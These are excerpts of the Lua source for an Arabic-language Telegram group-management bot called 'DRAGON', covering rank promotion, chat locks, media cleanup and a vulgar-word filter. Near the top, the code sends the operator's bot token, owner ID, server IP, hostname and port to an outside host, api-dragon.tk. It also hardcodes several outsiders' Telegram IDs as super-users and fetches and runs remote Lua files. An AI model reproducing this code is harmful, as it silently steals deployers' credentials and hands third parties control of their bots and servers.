...
data,res = https.request("https://api-dragon.tk/api-DeVAhmed/Dragon.php?bn=DRAGON&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://api-dragon.tk/api-DeVAhmed/Dragon.php?n=DRAGON&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
...
~> channel Source | @Src_DeV
~> channel Updates | @Updates_Dragon
~> Developer | @X_EXTRA
]])
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/qithoniq/Files_Dragon/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,6373798952,1260465030,5401732523}   
...
local hash = database:sismember(bot_id.."DeVAhmed:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or Devahmed(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
...
var = true  
elseif tonumber(user_id) == tonumber(5401732523) then
var = true  
elseif tonumber(user_id) == tonumber(1260465030) then
var = true  
...
var = true  
elseif database:sismember(bot_id..'DeVAhmed:MN:TF'..chat_id, user_id) then
var = true 
...
local UserName = (data.username_ or "Src_DeV")
...
local bl = ' ℘︙ اهلا عزيزي آلمـطـور\n ℘︙ آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n ℘︙ تسـتطـيع‌‏ آلتحگم باوامر البوت\n ℘︙ من خلال الكيبورت خاص بك\n ℘︙ قناة سورس البوت [اضغط هنا](t.me/Src_DeV)'
local keyboard = {
{'الاحصائيات ℘'},
...
os.execute('wget https://raw.githubusercontent.com/qithoniq/src_dragon/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' ℘︙ تم تحديث السورس \n ℘︙ لديك اخر اصدار لسورس دراكون\n ℘︙ الاصدار » { v 1.6 }')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ℘' and Devahmed(msg) then 
...
-------------
if text == "🐉 حصريات و تحديثات دراكـون 🐉" and Devahmed(msg) then  
local updatech =[[
...
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'Src_DeV')..')'
status  = '\n ℘︙ تم ترقيته مطور'
...
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Src_DeV')..')'
status  = '\n ℘︙ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ℘︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Src_DeV')..') \n ℘︙ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](T.ME/Src_DeV)}\n ℘︙ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناوي.ج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك","مص","نيجوني","فروخ التلي","كس مرتك","نيجني","تعال امص زربك","خلي ابوس زبك","تعال انيجك","انيج امك","انيج اختك","اخوك فرخي","امك تنيجني","كسه","كسمي","كسختي","اه اه زبك حلو","بيش نيجة","بس نيجة","حبيبتي نيجيني"}
for k,v in pairs(list) do
...
send(msg.chat_id_,0, " ℘︙ عذرا » {["..data.first_name_.."](T.ME/Src_DeV)}\n ℘︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
bnnaGet(msg.sender_user_id_, DeVAhmed_name)
end
...
℘ ⦑ SOURCE DRAGON ⦒ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
℘︙ [Source Channel](t.me/Src_DeV)
℘︙ [Source Update ](t.me/FIDRG)     
℘︙ [Source developer](t.me/DeVAhmed)     
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ℘︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Src_DeV')..') \n ℘︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ℘︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Src_DeV')..') \n ℘︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
if text == ("مسح قائمه العام") and Devahmed(msg) then
...
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."DeVAhmed:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'DeVAhmed:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
if Devahmed(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/qithoniq/Files_Dragon/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ℘︙ اهلا بك في متجر ملفات دراكون\n ℘︙ ملفات السورس ↓\nٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n\n"
local TextE = "\nٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n ℘︙ علامة تعني { ✔️ } ملف مفعل\n ℘︙ علامة تعني { ✖ } ملف معطل\n ℘︙ قناة سورس دراكون ↓\n".." ℘︙ [اضغط هنا لدخول](t.me/Src_DeV) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/qithoniq/Files_Dragon/main/File_Bot/"..file)
if res == 200 then
...
database:del(bot_id..'DeVAhmed:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ℘︙ تم مسح المنظفين')
end
if text == ("المنظفين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'DeVAhmed:MN:TF'..msg.chat_id_)
t = "\n ℘︙ قائمة المنظفين \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'DeVAhmed:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Src_DeV')..')'
status  = '\n ℘︙ تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
...
database:sadd(bot_id..'DeVAhmed:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'Src_DeV')..')'
status  = '\n ℘︙ تم ترقيته منظف'
texts = usertext..status
else
...
database:sadd(bot_id..'DeVAhmed:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Src_DeV')..')'
status  = '\n ℘︙ تم ترقيته منظف'
...
function start_function(extra, result, success)
database:srem(bot_id..'DeVAhmed:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Src_DeV')..')'
...
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'DeVAhmed:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'Src_DeV')..')'
status  = '\n ℘︙ تم تنزيله من المنظفين'
texts = usertext..status
else
...
database:srem(bot_id..'DeVAhmed:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Src_DeV')..')'
status  = '\n ℘︙ تم تنزيله من المنظفين'
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Src_DeV')..')'
status  = '\n ℘︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ℘︙ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Src_DeV')..')'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ℘︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'Src_DeV')..')'..'\n ℘︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if not database:get(bot_id..'DeVAhmed:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
...
database:setex(bot_id..'DeVAhmed:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
...
database:sadd(bot_id.."DeVAhmed:allM"..msg.chat_id_, msg.id_)
end
if text == ("امسح") and cleaner(msg) then  
local list = database:smembers(bot_id.."DeVAhmed:allM"..msg.chat_id_)
for k,v in pairs(list) do
local Message = v
if Message then
t = "℘︙ تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."DeVAhmed:allM"..msg.chat_id_)
end
end
if #list == 0 then
...
local num = database:smembers(bot_id.."DeVAhmed:allM"..msg.chat_id_)
...
if database:sismember(bot_id..'DeVAhmed:MN:TF'..msg.chat_id_, result.id_) then
mn = 'منظف ،' else mn = '' end
...
own = 'مدير ،' else own = '' end
if database:sismember(bot_id..'DeVAhmed:MN:TF'..msg.chat_id_, result.sender_user_id_) then
mn = 'منظف ،' else mn = '' end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙳𝚁𝙰𝙶𝙾𝙽.',url="t.me/Src_DeV"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."Src_DeV:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."Src_DeV:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."Src_DeV:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."Src_DeV:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"℘︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."Src_DeV:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."Src_DeV:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'Src_DeV')..')'
local iduser = result.sender_user_id_
...
{
{text = '𝐃𝐑𝐀𝐆𝐎𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/Src_DeV"},
},
}
local msg_id = msg.id_/2097152/0.5
